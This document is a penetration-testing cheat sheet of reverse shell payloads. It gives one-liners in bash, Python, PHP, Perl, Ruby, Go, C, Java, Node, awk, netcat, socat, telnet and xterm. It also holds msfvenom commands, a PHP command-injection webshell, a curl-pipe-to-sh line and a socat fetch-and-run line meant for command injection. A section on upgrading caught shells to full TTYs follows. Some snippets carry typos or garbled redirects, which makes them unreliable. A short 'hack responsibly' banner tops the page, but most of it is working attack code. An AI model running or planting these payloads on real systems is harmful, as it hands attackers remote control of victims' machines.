# Getting Access

{% hint style="success" %}
Hack Responsibly.

Always ensure you have **explicit** permission to access any computer system **before** using any of the techniques contained in these documents. You accept full responsibility for your actions by applying any knowledge gained here.
{% endhint %}

TODO: description, methodology, and script prep for each section (issue [#15](https://github.com/zweilosec/Infosec-Notes/issues/15))

* Add description and methodology as needed for each section
* Prep all code examples for scripting (replace IPs and ports with variables, etc.)
* Ensure code examples' variables are appropriate for their respective programming language

## Reverse Shells

### Reverse Shell as a Service - [https://shell.now.sh](https://shell.now.sh)

[https://github.com/lukechilds/reverse-shell](https://github.com/lukechilds/reverse-shell)

```bash
curl https://shell.now.sh/<ip>:<port> | sh
```

### **Bash Reverse Shells**

#### **TCP:**

```bash
bash -i >& /dev/tcp/192.168.1.2/4444 0>&1
```

#### **UDP:**

```bash
sh -i >& /dev/udp/192.168.1.2/5555 0>&1
```

### exec Reverse Shell

```bash
0<&196;exec 196<>/dev/tcp/$ip/$port; sh <&196 >&196 2>&196
```

```bash
exec 5<>/dev/tcp/$ip/$port && while read line 0<&5; do $line 2>&5 >&5; done
```

### Python Reverse Shells

```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.15.57",8099));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

```python
export RHOST="192.168.1.2";export RPORT=4444;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
```

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.2",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

#### Using Socat UDP Listener

```python
python -c 'import socket,pty,os;lhost = "10.10.15.80"; lport = 100; s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.connect((lhost, lport)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); os.putenv("HISTFILE",'/dev/null'); pty.spawn("/bin/bash"); s.close();

#UDP Socat Listener
socat file:`tty`,echo=0,raw  udp-listen:100
```

### **PHP Reverse Shell**

```php
php -r '$sock=fsockopen("192.168.1.2",80);exec("/bin/sh -i <&3 >&3 2>&3");'
```

```php
php -r '$sock=fsockopen("192.168.1.2",4444);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
```

### PHP command injection webshell:

```php
<?php system($_GET['variable_name']); ?>
```

### **Ruby Reverse Shell**

```ruby
ruby -rsocket -e'f=TCPSocket.open("192.168.1.2",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

### **Telnet Reverse Shells**

```bash
mknod backpipe p && telnet $ip $port 0<backpipe | /bin/bash 1>backpipe
```

```bash
telnet $ip $port1 | /bin/bash | telnet $ip $port2
```

```bash
rm -f /tmp/p; mknod /tmp/p p && telnet 192.168.1.2 4444 0/tmp/p
```

### **Netcat Reverse Shells**

```bash
nc -e /bin/sh 192.168.1.2 80
```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc 192.168.1.2 4444 0/tmp/p
```

```bash
rm -f /var/tmp/backpipe 
mknod /var/tmp/backpipe p
nc $attack_ip $port 0</var/tmp/backpipe | /bin/bash 1>/var/tmp/backpipe
```

### **Socat Reverse Shell**

```bash
socat tcp-connect:$IP:$PORT exec:"bash -li",pty,stderr,setsid,sigint,sane
```

```bash
#Listener
socat file:`tty`,raw,echo=0 tcp-listen:4444
#Victim
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```

### **Golang Reverse Shell**

```go
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","192.168.1.2:4444");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
```

### **Perl Reverse Shell**

```perl
perl -e 'use Socket;$i="192.168.1.2";$p=8081;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

```perl
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"<IP>:<PORT>");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

### **Awk Reverse Shell**

```
awk 'BEGIN {s = "/inet/tcp/0/192.168.1.2/4444"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```

### **NodeJS Reverse Shell**

```
require('child_process').exec('nc -e /bin/sh 192.168.1.2 4444')
```

### **JavaScript Reverse Shell**

```javascript
(function(){ var net = require("net"), cp = require("child_process"), sh = cp.spawn("/bin/sh", []); var client = new net.Socket(); client.connect(LPORT, "LHOST", function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/; })();
```

### **Java Reverse Shell**

```java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/attackerip/443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

### **C Reverse Shell**

```c
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <unistd.h>

int main ()

{
const char* ip = "192.168.1.2";
struct sockaddr_in addr;
addr.sin_family = AF_INET;
addr.sin_port = htons(4444);
inet_aton(ip, &addr.sin_addr);
int sockfd = socket(AF_INET, SOCK_STREAM, 0);
connect(sockfd, (struct sockaddr *)&addr, sizeof(addr));
for (int i = 0; i < 3; i++)
{
dup2(sockfd, i);
}
execve("/bin/sh", NULL, NULL);
return 0;
}
```

### XTERM Reverse Shell

```bash
# Start an open X Server on your system (:1 – which listens on TCP port 6001)
apt-get install xnest
Xnest :1

# Then remember to authorise on your system the target IP to connect to you
xterm -display 127.0.0.1:1

# Run this INSIDE the spawned xterm on the open X Server
xhost +targetip

# Then on the target connect back to the your X Server
xterm -display attackerip:1
/usr/openwin/bin/xterm -display attackerip:1
or
$ DISPLAY=attackerip:0 xterm
```

### **Meterpreter Reverse Shells**

* **Linux Non-Staged reverse TCP**

```
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.2 LPORT=4444 -f elf >reversetcp.elf
```

* **Linux Staged reverse TCP**

```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=4444 -f elf >reversetcp.elf
```

## Upgrading remote shells

After catching a shell through netcat, you are placed in a shell that has very limited functionality. If the remote machine has python or python3 installed you can easily upgrade to a fully functional TTY shell.

&#x20;**Note:** To check if the shell is a TTY shell use the `tty` command.

### Upgrade to fully interactive shell (python example):

```bash
#On victim machine
python -c 'import pty;pty.spawn("/bin/bash")'; #spawn python psuedo-shell
ctrl-z #send to background

#On attacker's machine
stty raw -echo #https://stackoverflow.com/questions/22832933/what-does-stty-raw-echo-do-on-os-x
stty -a #get local number of rows & columns
fg #to return shell to foreground

#On victim machine
export SHELL=bash
stty rows $x columns $y #Set remote shell to x number of rows & y columns
export TERM=xterm-256color #allows you to clear console, and have color output
```

### Other Languages:

```python
echo os.system('/bin/bash')
/bin/sh -i

#python3
python3 -c 'import pty; pty.spawn("/bin/sh")'

#perl
perl -e 'exec "/bin/sh";'

#ruby
exec "/bin/sh"
ruby -e 'exec "/bin/sh"'

#lua
lua -e "os.execute('/bin/sh')"
```

### Using “Expect” To Get A TTY

If you’re lucky enough to have the [Expect](http://en.wikipedia.org/wiki/Expect) language installed just a few lines of code will get you a good enough TTY to run useful tools such as “ssh”, “su” and “login”.

```bash
#Create a script called `sh.exp`

#!/usr/bin/expect
# Spawn a shell, then allow the user to interact with it.
# The new shell will have a good enough TTY to run tools like ssh, su and login
spawn sh
interact
```

### **Using socat**

Another option is to upload the binary for `socat` to the victim machine and magically get a fully interactive shell. Download the appropriate binaries from [https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries). Socat needs to be on both machines for this to work.

```bash
#Listener:
socat file:`tty`,raw,echo=0 tcp-listen:4444

#Victim:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.15.100:4444
```

#### socat one-liner

This one-liner can be injected wherever you can get command injection for an instant reverse shell. Point the path to the binary to your local http server if internet access is limited on the victim.

```bash
wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /dev/shm/socat; chmod +x /dev/shm/socat; /dev/shm/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.15.100:4444
```

### &#xD;Using stty options&#xD;

```bash
# In reverse shell
python -c 'import pty; pty.spawn("/bin/bash")'
Ctrl-Z

# In Kali
stty raw -echo
fg

# In reverse shell
reset
export SHELL=bash
export TERM=xterm-256color
stty rows <num> columns <cols>
```

Misc unsorted
-------------

```bash
bash -i >& /dev/tct/10.10.14.148/9001 0>&1

#URL encoded: 
bash+-i+>%26+/dev/tcp/10.10.14.148/9001+0>%261
```

#### Bash

Some versions of [bash can send you a reverse shell](http://www.gnucitizen.org/blog/reverse-shell-with-bash/) (this was tested on Ubuntu 10.10):

* Works more reliably when prefixed with `bash -c` (thanks Ippsec!)

```bash
bash -c 'bash -i >& /dev/tcp/10.0.0.1/8080 0>&1'
```

#### PERL

Here’s a shorter, feature-free version of the [perl-reverse-shell](http://pentestmonkey.net/tools/web-shells/perl-reverse-shell):

```perl
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

There’s also an [alternative PERL revere shell here](http://www.plenz.com/reverseshell). (broken link?)

#### Python

This was tested under Linux / Python 2.7:

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

#### PHP

This code assumes that the TCP connection uses file descriptor 3. This worked on my test system. If it doesn’t work, try 4, 5, 6…

```php
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```

If you want a .php file to upload, see the more featureful and robust [php-reverse-shell](http://pentestmonkey.net/tools/web-shells/php-reverse-shell).

#### Ruby

```ruby
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

#### Netcat

Netcat is rarely present on production systems and even if it is there are several version of netcat, some of which don’t support the -e option.

```
nc -e /bin/sh 10.0.0.1 1234
```

If you have the wrong version of netcat installed, [Jeff Price points out here](http://www.gnucitizen.org/blog/reverse-shell-with-bash/#comment-127498) that you might still be able to get your reverse shell back like this:

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
```

#### Java

```java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

#### xterm

One of the simplest forms of reverse shell is an xterm session. The following command should be run on the server. It will try to connect back to you (10.0.0.1) on TCP port 6001.

```
xterm -display 10.0.0.1:1
```

To catch the incoming xterm, start an X-Server (:1 – which listens on TCP port 6001). One way to do this is with Xnest (to be run on your system):

```
Xnest :1
```

You’ll need to authorize the target to connect to you (command also run on your host):

```
xhost +targetip
```

## Resources

* [http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
* [http://pentestmonkey.net/blog/post-exploitation-without-a-tty](http://pentestmonkey.net/blog/post-exploitation-without-a-tty)
* [https://bernardodamele.blogspot.com/2011/09/reverse-shells-one-liners.html](https://bernardodamele.blogspot.com/2011/09/reverse-shells-one-liners.html)
* [https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)
*

If you like this content and would like to see more, please consider [buying me a coffee](https://www.buymeacoffee.com/zweilosec)!
